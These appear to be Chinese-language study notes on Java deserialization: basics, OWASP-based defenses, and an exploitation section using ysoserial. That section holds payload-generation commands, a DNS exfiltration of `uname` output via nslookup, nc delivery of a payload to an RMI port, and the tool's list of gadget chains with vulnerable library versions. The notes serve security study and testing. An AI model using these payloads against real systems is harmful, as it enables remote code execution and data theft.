### 基础 - Java 序列化与反序列化

* 序列化
  * 概念：把 Java对象 转换为 二进制字节序列 的过程
  * 实现：ObjectOutputStream类的 writeObject() 方法
* 反序列化
  * 概念：把 二进制字节序列 恢复为 Java对象 的过程
  * 实现：ObjectInputStream 类的 readObject() 方法

### 防御

* 原生反序列化防御
  * 避免用户输入可控 - 不要反序列化不可信的数据
  * 认证 - 给反序列数据加密签名且解密需在反序列之前
  * 认证 - 经过认证授权 才能使用反序列化接口
  * 限制访问源 - 反序列化服务只允许监听在本地

[CheatSheetSeries/Deserialization_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Deserialization_Cheat_Sheet.md)


### Exploit

* 生成payloads(exploit unsafe Java object deserialization.)
  * https://github.com/frohoff/ysoserial

```
# 1
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
$ java -jar ysoserial.jar CommonsCollections5 "open -a Calculator" | base64
$ java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64

# 2
$ java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > ping_Groovy1_payload.bin
$ nc 10.10.10.10 1099 < ping_Groovy1_payload.bin

# 3
$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```



```
java -jar ysoserial-master-30099844c6-1.jar
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
七月 01, 2020 11:08:15 上午 org.reflections.Reflections scan
信息: Reflections took 232 ms to scan 1 urls, producing 18 keys and 146 values
     Payload             Authors                                Dependencies
     -------             -------                                ------------
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Clojure             @JackOfMostTrades                      clojure:1.8.0
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                               commons-collections:3.1
     CommonsCollections2 @frohoff                               commons-collections4:4.0
     CommonsCollections3 @frohoff                               commons-collections:3.1
     CommonsCollections4 @frohoff                               commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                               groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser                       js:1.7R2
     MozillaRhino2       @_tint0                                js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                              rome:1.0
     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
```
